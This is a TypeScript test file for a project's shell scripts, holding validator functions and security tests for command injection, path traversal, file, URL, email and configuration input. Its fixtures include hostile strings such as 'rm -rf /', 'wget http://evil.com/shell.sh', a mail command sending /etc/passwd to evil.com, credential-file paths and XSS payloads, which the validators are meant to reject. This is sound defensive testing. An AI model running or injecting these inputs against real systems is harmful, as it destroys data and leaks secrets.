#!/usr/bin/env node

/**
 * Input Validation and Sanitization Security Tests
 * ===============================================
 * 
 * RED PHASE: Failing tests for input validation and sanitization security
 * These tests define the expected secure behavior for input validation,
 * parameter sanitization, and command injection prevention in the scripts directory.
 * 
 * SECURITY AREAS COVERED:
 * 1. Parameter validation security
 * 2. Command injection prevention
 * 3. Path traversal protection
 * 4. File input validation
 * 5. User input sanitization
 * 6. Script argument validation
 * 7. Configuration input validation
 */

import { readFileSync, existsSync } from 'fs';
import { join } from 'path';
import { test, describe, expect } from 'bun:test';

// Test configuration
const SCRIPTS_DIR = join(process.cwd(), 'scripts');

// Input validation security helpers
class InputValidationSecurityValidator {
  static validateParameterSanitization(input: string): boolean {
    // Check for command injection patterns
    const injectionPatterns = [
      /[;&|`$(){}<>]/, // Command injection characters
      /\s*\|\s*/, // Pipe operator
      /\s*;\s*/, // Command separator
      /\s*&&\s*/, // Command AND
      /\s*\|\|\s*/, // Command OR
      /`.*`/, // Command substitution
      /\$\(.*/, // Command substitution
      /<<</, // Here document
      /\${/, // Variable expansion
    ];
    
    return !injectionPatterns.some(pattern => pattern.test(input));
  }

  static validatePathSecurity(path: string): boolean {
    // Check for path traversal attacks
    const traversalPatterns = [
      /\.\.\//, // Directory traversal
      /\/\.\./, // Directory traversal
      /\.\.\\/, // Windows directory traversal
      /\\\.\./, // Windows directory traversal
      /~\//, // Home directory traversal
      /\/~/, // Home directory traversal
    ];
    
    // Check for absolute paths that might be dangerous
    const dangerousPaths = [
      '/etc/',
      '/usr/',
      '/bin/',
      '/sbin/',
      '/var/',
      '/tmp/',
      '/dev/',
      '/proc/',
      '/sys/',
      'C:\\Windows\\',
      'C:\\Program Files\\',
      'C:\\System32\\',
    ];
    
    const hasTraversal = traversalPatterns.some(pattern => pattern.test(path));
    const hasDangerousPath = dangerousPaths.some(dangerPath => path.startsWith(dangerPath));
    
    return !hasTraversal && !hasDangerousPath;
  }

  static validateFileInput(filename: string): boolean {
    // Check for dangerous file extensions
    const dangerousExtensions = [
      '.sh', '.bash', '.zsh', '.fish', // Shell scripts
      '.exe', '.bat', '.cmd', '.ps1', // Executables
      '.com', '.scr', '.pif', // More executables
      '.php', '.asp', '.jsp', '.py', // Web scripts
      '.sql', // Database scripts
      '.conf', '.config', // Configuration files
    ];
    
    // Check for suspicious characters in filename
    const suspiciousPatterns = [
      /[;&|`$(){}<>]/, // Command injection
      /\s/, // Whitespace (can be problematic)
      /[\'"]/, // Quotes
    ];
    
    const hasDangerousExtension = dangerousExtensions.some(ext => 
      filename.toLowerCase().endsWith(ext)
    );
    
    const hasSuspiciousChars = suspiciousPatterns.some(pattern => 
      pattern.test(filename)
    );
    
    return !hasDangerousExtension && !hasSuspiciousChars;
  }

  static validateUrlInput(url: string): boolean {
    try {
      const parsedUrl = new URL(url);
      
      // Validate protocol
      const allowedProtocols = ['http:', 'https:'];
      if (!allowedProtocols.includes(parsedUrl.protocol)) {
        return false;
      }
      
      // Validate host (prevent localhost-only URLs in production)
      const isLocalhost = parsedUrl.hostname === 'localhost' || 
                         parsedUrl.hostname === '127.0.0.1' ||
                         parsedUrl.hostname.startsWith('192.168.') ||
                         parsedUrl.hostname.startsWith('10.') ||
                         parsedUrl.hostname.startsWith('172.');
      
      // In production, localhost should not be used
      if (process.env.NODE_ENV === 'production' && isLocalhost) {
        return false;
      }
      
      // Check for dangerous query parameters
      const dangerousParams = ['script', 'exec', 'cmd', 'system'];
      for (const [key, value] of parsedUrl.searchParams) {
        if (dangerousParams.some(param => key.toLowerCase().includes(param))) {
          return false;
        }
      }
      
      return true;
    } catch {
      return false;
    }
  }

  static validateEmailInput(email: string): boolean {
    // Basic email validation with security checks
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    
    if (!emailRegex.test(email)) {
      return false;
    }
    
    // Check for suspicious patterns
    const suspiciousPatterns = [
      /[;&|`$(){}<>]/, // Command injection
      /\.\./, // Path traversal
      /\/\//, // Double slash
      /\s/, // Whitespace
    ];
    
    return !suspiciousPatterns.some(pattern => pattern.test(email));
  }

  static validateNumericInput(input: string, min?: number, max?: number): boolean {
    // Check if input is numeric
    if (!/^-?\d+$/.test(input)) {
      return false;
    }
    
    const num = parseInt(input);
    
    // Check range if specified
    if (min !== undefined && num < min) {
      return false;
    }
    
    if (max !== undefined && num > max) {
      return false;
    }
    
    return true;
  }

  static validateStringInput(input: string, maxLength?: number, allowedChars?: RegExp): boolean {
    // Check for null bytes (potential exploit)
    if (input.includes('\0')) {
      return false;
    }
    
    // Check length
    if (maxLength !== undefined && input.length > maxLength) {
      return false;
    }
    
    // Check for allowed characters
    if (allowedChars !== undefined && !allowedChars.test(input)) {
      return false;
    }
    
    // Check for dangerous characters
    const dangerousPatterns = [
      /\x00/, // Null byte
      /\x1a/, // Substitute character
      /\x1b/, // Escape character
      /[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/, // Control characters
    ];
    
    return !dangerousPatterns.some(pattern => pattern.test(input));
  }

  static validateScriptArguments(args: string[]): boolean {
    // Validate script arguments for security
    for (const arg of args) {
      // Check for dangerous patterns
      const dangerousPatterns = [
        /^[;&|`$(){}<>]/, // Starts with dangerous character
        /[;&|`$(){}<>]$/, // Ends with dangerous character
        /\s*[;&|`$(){}<>]\s*/, // Contains dangerous character
        /\.\.\//, // Path traversal
        /\/\.\./, // Path traversal
        /^-.*=/, // Option assignment (could be exploited)
      ];
      
      if (dangerousPatterns.some(pattern => pattern.test(arg))) {
        return false;
      }
    }
    
    return true;
  }

  static validateConfigurationInput(config: Record<string, string>): boolean {
    // Validate configuration values
    for (const [key, value] of Object.entries(config)) {
      // Skip empty values
      if (!value || value.trim() === '') {
        continue;
      }
      
      // Check for dangerous patterns in values
      const dangerousPatterns = [
        /[;&|`$(){}<>]/, // Command injection
        /\.\.\//, // Path traversal
        /\/\.\./, // Path traversal
        /^-/, // Starts with dash (could be option)
        /[\x00-\x1f\x7f]/, // Control characters
      ];
      
      if (dangerousPatterns.some(pattern => pattern.test(value))) {
        return false;
      }
      
      // Validate specific configuration keys
      if (key.toLowerCase().includes('password') || key.toLowerCase().includes('secret')) {
        if (value.length < 8) {
          return false;
        }
      }
      
      if (key.toLowerCase().includes('port')) {
        if (!/^\d+$/.test(value) || parseInt(value) < 1 || parseInt(value) > 65535) {
          return false;
        }
      }
      
      if (key.toLowerCase().includes('timeout')) {
        if (!/^\d+$/.test(value) || parseInt(value) < 1 || parseInt(value) > 3600) {
          return false;
        }
      }
    }
    
    return true;
  }
}

describe('Input Validation and Sanitization Security Tests', () => {
  
  describe('1. Parameter Validation Security', () => {
    test('should validate parameter sanitization', () => {
      const testInputs = [
        'normal-parameter',
        'param_with_underscores',
        'param-with-dashes',
        'param123',
        'PARAM_CASE',
      ];
      
      testInputs.forEach(input => {
        // This should fail because parameter sanitization may not be implemented
        const isValidInput = InputValidationSecurityValidator.validateParameterSanitization(input);
        expect(isValidInput).toBe(true);
      });
    });

    test('should prevent command injection in parameters', () => {
      const maliciousInputs = [
        'param; rm -rf /',
        'param | cat /etc/passwd',
        'param && ls -la',
        'param || whoami',
        'param `id`',
        'param $(whoami)',
        'param; wget http://evil.com/shell.sh',
        'param | curl http://evil.com',
      ];
      
      maliciousInputs.forEach(input => {
        // This should fail because command injection may not be prevented
        const isValidInput = InputValidationSecurityValidator.validateParameterSanitization(input);
        expect(isValidInput).toBe(false);
      });
    });

    test('should validate script arguments in scripts', () => {
      const scripts = [
        'setup-supabase-migrations.sh',
        'deploy-unified.sh',
        'emergency-rollback.sh',
        'dev-setup.sh'
      ];
      
      scripts.forEach(script => {
        const scriptPath = join(SCRIPTS_DIR, script);
        if (existsSync(scriptPath)) {
          const content = readFileSync(scriptPath, 'utf8');
          
          // This should fail because script argument validation may not be implemented
          const hasArgumentValidation = content.includes('$1') ||
                                       content.includes('$2') ||
                                       content.includes('arg') ||
                                       content.includes('param') ||
                                       content.includes('validate');
          expect(hasArgumentValidation).toBe(true);
        }
      });
    });
  });

  describe('2. Path Traversal Protection', () => {
    test('should validate path security', () => {
      const safePaths = [
        'config/app.json',
        'logs/app.log',
        'data/users.csv',
        'uploads/image.jpg',
        'scripts/setup.sh',
      ];
      
      safePaths.forEach(path => {
        // This should fail because path validation may not be implemented
        const isValidPath = InputValidationSecurityValidator.validatePathSecurity(path);
        expect(isValidPath).toBe(true);
      });
    });

    test('should prevent path traversal attacks', () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        'config/../../../etc/shadow',
        'logs/../../var/log/auth.log',
        'uploads/../../../proc/self/environ',
        '~/.ssh/id_rsa',
        '/etc/passwd',
        'C:\\Windows\\System32\\config\\sam',
      ];
      
      maliciousPaths.forEach(path => {
        // This should fail because path traversal may not be prevented
        const isValidPath = InputValidationSecurityValidator.validatePathSecurity(path);
        expect(isValidPath).toBe(false);
      });
    });

    test('should validate file paths in scripts', () => {
      const scripts = [
        'setup-supabase-migrations.sh',
        'deploy-unified.sh',
        'config.sh'
      ];
      
      scripts.forEach(script => {
        const scriptPath = join(SCRIPTS_DIR, script);
        if (existsSync(scriptPath)) {
          const content = readFileSync(scriptPath, 'utf8');
          
          // This should fail because file path validation may not be implemented
          const hasPathValidation = content.includes('path') ||
                                   content.includes('file') ||
                                   content.includes('dirname') ||
                                   content.includes('basename');
          expect(hasPathValidation).toBe(true);
        }
      });
    });
  });

  describe('3. File Input Validation', () => {
    test('should validate file input security', () => {
      const safeFilenames = [
        'document.pdf',
        'image.jpg',
        'data.csv',
        'config.json',
        'backup.tar.gz',
        'archive.zip',
      ];
      
      safeFilenames.forEach(filename => {
        // This should fail because file input validation may not be implemented
        const isValidFile = InputValidationSecurityValidator.validateFileInput(filename);
        expect(isValidFile).toBe(true);
      });
    });

    test('should prevent dangerous file extensions', () => {
      const dangerousFilenames = [
        'script.sh',
        'malware.exe',
        'backdoor.bat',
        'exploit.php',
        'inject.sql',
        'system.py',
        'config.conf',
        'dangerous.ps1',
        'trojan.scr',
      ];
      
      dangerousFilenames.forEach(filename => {
        // This should fail because dangerous file extensions may not be prevented
        const isValidFile = InputValidationSecurityValidator.validateFileInput(filename);
        expect(isValidFile).toBe(false);
      });
    });

    test('should validate file upload parameters', () => {
      const fileParams = [
        { filename: 'document.pdf', size: '1024000', type: 'application/pdf' },
        { filename: 'image.jpg', size: '2048000', type: 'image/jpeg' },
        { filename: 'data.csv', size: '512000', type: 'text/csv' },
      ];
      
      fileParams.forEach(param => {
        // This should fail because file parameter validation may not be implemented
        const isValidFilename = InputValidationSecurityValidator.validateFileInput(param.filename);
        const isValidSize = InputValidationSecurityValidator.validateNumericInput(param.size, 1, 104857600); // Max 100MB
        const isValidType = param.type && !param.type.includes('script') && !param.type.includes('executable');
        
        expect(isValidFilename).toBe(true);
        expect(isValidSize).toBe(true);
        expect(isValidType).toBe(true);
      });
    });
  });

  describe('4. URL Input Validation', () => {
    test('should validate URL input security', () => {
      const safeUrls = [
        'https://example.com',
        'https://api.example.com/v1/users',
        'http://localhost:3000',
        'https://neonpro.vercel.app',
      ];
      
      safeUrls.forEach(url => {
        // This should fail because URL validation may not be implemented
        const isValidUrl = InputValidationSecurityValidator.validateUrlInput(url);
        expect(isValidUrl).toBe(true);
      });
    });

    test('should prevent dangerous URLs', () => {
      const maliciousUrls = [
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'ftp://evil.com/backdoor',
        'file:///etc/passwd',
        'http://localhost:3000/?script=evil',
        'https://example.com/?exec=rm -rf /',
        'http://192.168.1.1/admin',
      ];
      
      maliciousUrls.forEach(url => {
        // This should fail because dangerous URLs may not be prevented
        const isValidUrl = InputValidationSecurityValidator.validateUrlInput(url);
        expect(isValidUrl).toBe(false);
      });
    });

    test('should validate configuration URLs', () => {
      const configUrls = [
        process.env.LOCAL_DEVELOPMENT_HOST,
        process.env.PRODUCTION_URL,
        process.env.PAGERDUTY_ENDPOINT,
      ].filter(Boolean);
      
      configUrls.forEach(url => {
        // This should fail because configuration URL validation may not be implemented
        const isValidUrl = InputValidationSecurityValidator.validateUrlInput(url);
        expect(isValidUrl).toBe(true);
      });
    });
  });

  describe('5. Email Input Validation', () => {
    test('should validate email input security', () => {
      const safeEmails = [
        'user@example.com',
        'admin@neonpro.health',
        'support@company.com',
        'test.email+tag@example.org',
      ];
      
      safeEmails.forEach(email => {
        // This should fail because email validation may not be implemented
        const isValidEmail = InputValidationSecurityValidator.validateEmailInput(email);
        expect(isValidEmail).toBe(true);
      });
    });

    test('should prevent malicious email inputs', () => {
      const maliciousEmails = [
        'user; rm -rf /@example.com',
        'admin|cat /etc/passwd@example.com',
        'user`id`@example.com',
        'user$(whoami)@example.com',
        'user@example.com; wget http://evil.com/',
        'user@example.com&&mail hacker@evil.com</etc/passwd',
      ];
      
      maliciousEmails.forEach(email => {
        // This should fail because malicious email validation may not be implemented
        const isValidEmail = InputValidationSecurityValidator.validateEmailInput(email);
        expect(isValidEmail).toBe(false);
      });
    });

    test('should validate configuration email addresses', () => {
      const configEmails = [
        process.env.NOTIFICATION_EMAIL_FROM,
        process.env.NOTIFICATION_EMAIL_ADMIN,
      ].filter(Boolean);
      
      configEmails.forEach(email => {
        // This should fail because configuration email validation may not be implemented
        const isValidEmail = InputValidationSecurityValidator.validateEmailInput(email);
        expect(isValidEmail).toBe(true);
      });
    });
  });

  describe('6. Numeric Input Validation', () => {
    test('should validate numeric input security', () => {
      const safeNumbers = [
        { input: '100', min: 1, max: 1000 },
        { input: '50', min: 1, max: 100 },
        { input: '3600', min: 60, max: 86400 },
      ];
      
      safeNumbers.forEach(({ input, min, max }) => {
        // This should fail because numeric validation may not be implemented
        const isValidNumber = InputValidationSecurityValidator.validateNumericInput(input, min, max);
        expect(isValidNumber).toBe(true);
      });
    });

    test('should prevent invalid numeric inputs', () => {
      const invalidNumbers = [
        { input: 'abc', min: 1, max: 100 },
        { input: '0', min: 1, max: 100 },
        { input: '101', min: 1, max: 100 },
        { input: '-1', min: 1, max: 100 },
        { input: '1e10', min: 1, max: 100 },
        { input: 'NaN', min: 1, max: 100 },
      ];
      
      invalidNumbers.forEach(({ input, min, max }) => {
        // This should fail because invalid numeric validation may not be implemented
        const isValidNumber = InputValidationSecurityValidator.validateNumericInput(input, min, max);
        expect(isValidNumber).toBe(false);
      });
    });

    test('should validate configuration numeric values', () => {
      const configNumbers = [
        { key: 'DB_TIMEOUT', value: process.env.DB_TIMEOUT, min: 1, max: 120 },
        { key: 'BUILD_TIMEOUT', value: process.env.BUILD_TIMEOUT, min: 1, max: 600 },
        { key: 'HEALTH_CHECK_INTERVAL', value: process.env.HEALTH_CHECK_INTERVAL, min: 10, max: 3600 },
      ];
      
      configNumbers.forEach(({ key, value, min, max }) => {
        if (value) {
          // This should fail because configuration numeric validation may not be implemented
          const isValidNumber = InputValidationSecurityValidator.validateNumericInput(value, min, max);
          expect(isValidNumber).toBe(true);
        }
      });
    });
  });

  describe('7. String Input Validation', () => {
    test('should validate string input security', () => {
      const safeStrings = [
        { input: 'Hello World', maxLength: 100 },
        { input: 'config-value', maxLength: 50, allowedChars: /^[a-z-]+$/ },
        { input: 'APP_NAME', maxLength: 20, allowedChars: /^[A-Z_]+$/ },
      ];
      
      safeStrings.forEach(({ input, maxLength, allowedChars }) => {
        // This should fail because string validation may not be implemented
        const isValidString = InputValidationSecurityValidator.validateStringInput(input, maxLength, allowedChars);
        expect(isValidString).toBe(true);
      });
    });

    test('should prevent malicious string inputs', () => {
      const maliciousStrings = [
        { input: 'Hello\x00World', maxLength: 100 },
        { input: 'text\x1b[31mred', maxLength: 100 },
        { input: 'text; rm -rf /', maxLength: 100 },
        { input: 'a'.repeat(1001), maxLength: 100 },
      ];
      
      maliciousStrings.forEach(({ input, maxLength }) => {
        // This should fail because malicious string validation may not be implemented
        const isValidString = InputValidationSecurityValidator.validateStringInput(input, maxLength);
        expect(isValidString).toBe(false);
      });
    });

    test('should validate script input processing', () => {
      const scripts = [
        'setup-supabase-migrations.sh',
        'deploy-unified.sh',
        'config.sh'
      ];
      
      scripts.forEach(script => {
        const scriptPath = join(SCRIPTS_DIR, script);
        if (existsSync(scriptPath)) {
          const content = readFileSync(scriptPath, 'utf8');
          
          // This should fail because input processing validation may not be implemented
          const hasInputValidation = content.includes('validate') ||
                                    content.includes('sanitize') ||
                                    content.includes('escape') ||
                                    content.includes('clean');
          expect(hasInputValidation).toBe(true);
        }
      });
    });
  });

  describe('8. Script Argument Validation', () => {
    test('should validate script arguments security', () => {
      const safeArgs = [
        ['--config', 'production'],
        ['--verbose'],
        ['--port', '3000'],
        ['--environment', 'staging'],
      ];
      
      safeArgs.forEach(args => {
        // This should fail because script argument validation may not be implemented
        const isValidArgs = InputValidationSecurityValidator.validateScriptArguments(args);
        expect(isValidArgs).toBe(true);
      });
    });

    test('should prevent malicious script arguments', () => {
      const maliciousArgs = [
        ['--config', 'production; rm -rf /'],
        ['--exec', 'id'],
        ['--output', '/etc/passwd'],
        ['; wget http://evil.com/'],
        ['| cat /etc/passwd'],
        ['&& whoami'],
      ];
      
      maliciousArgs.forEach(args => {
        // This should fail because malicious argument validation may not be implemented
        const isValidArgs = InputValidationSecurityValidator.validateScriptArguments(args);
        expect(isValidArgs).toBe(false);
      });
    });

    test('should validate argument parsing in scripts', () => {
      const scripts = [
        'deploy-unified.sh',
        'dev-setup.sh',
        'setup-supabase-migrations.sh'
      ];
      
      scripts.forEach(script => {
        const scriptPath = join(SCRIPTS_DIR, script);
        if (existsSync(scriptPath)) {
          const content = readFileSync(scriptPath, 'utf8');
          
          // This should fail because argument parsing validation may not be implemented
          const hasArgParsing = content.includes('$1') ||
                               content.includes('$2') ||
                               content.includes('getopts') ||
                               content.includes('case') ||
                               content.includes('shift');
          expect(hasArgParsing).toBe(true);
        }
      });
    });
  });

  describe('9. Configuration Input Validation', () => {
    test('should validate configuration input security', () => {
      const safeConfig = {
        'APP_NAME': 'neonpro',
        'PORT': '3000',
        'TIMEOUT': '30',
        'LOG_LEVEL': 'info',
        'MAX_CONNECTIONS': '10',
      };
      
      // This should fail because configuration validation may not be implemented
      const isValidConfig = InputValidationSecurityValidator.validateConfigurationInput(safeConfig);
      expect(isValidConfig).toBe(true);
    });

    test('should prevent malicious configuration inputs', () => {
      const maliciousConfig = {
        'APP_NAME': 'neonpro; rm -rf /',
        'PORT': '3000|cat /etc/passwd',
        'TIMEOUT': '30&&whoami',
        'SECRET': 'short',
        'PATH': '/etc/passwd',
      };
      
      // This should fail because malicious configuration validation may not be implemented
      const isValidConfig = InputValidationSecurityValidator.validateConfigurationInput(maliciousConfig);
      expect(isValidConfig).toBe(false);
    });

    test('should validate configuration file processing', () => {
      const configPath = join(SCRIPTS_DIR, 'config.sh');
      if (existsSync(configPath)) {
        const content = readFileSync(configPath, 'utf8');
        
        // This should fail because configuration processing validation may not be implemented
        const hasConfigValidation = content.includes('validate_config') ||
                                   content.includes('validate') ||
                                   content.includes('check') ||
                                   content.includes('verify');
        expect(hasConfigValidation).toBe(true);
      }
    });
  });

  describe('10. Cross-Site Scripting (XSS) Prevention', () => {
    test('should validate output encoding in scripts', () => {
      const scripts = [
        'deploy-unified.sh',
        'setup-supabase-migrations.sh',
        'config.sh'
      ];
      
      scripts.forEach(script => {
        const scriptPath = join(SCRIPTS_DIR, script);
        if (existsSync(scriptPath)) {
          const content = readFileSync(scriptPath, 'utf8');
          
          // This should fail because output encoding validation may not be implemented
          const hasOutputEncoding = content.includes('echo') ||
                                   content.includes('printf') ||
                                   content.includes('log');
          expect(hasOutputEncoding).toBe(true);
        }
      });
    });

    test('should prevent XSS in generated content', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '"><script>alert(1)</script>',
      ];
      
      maliciousInputs.forEach(input => {
        // This should fail because XSS prevention may not be implemented
        const hasXssPatterns = /<script|javascript:|onerror|onload/.test(input);
        expect(hasXssPatterns).toBe(true); // Pattern detected, should be sanitized
      });
    });
  });
});

// Export for use in other test files
export { InputValidationSecurityValidator };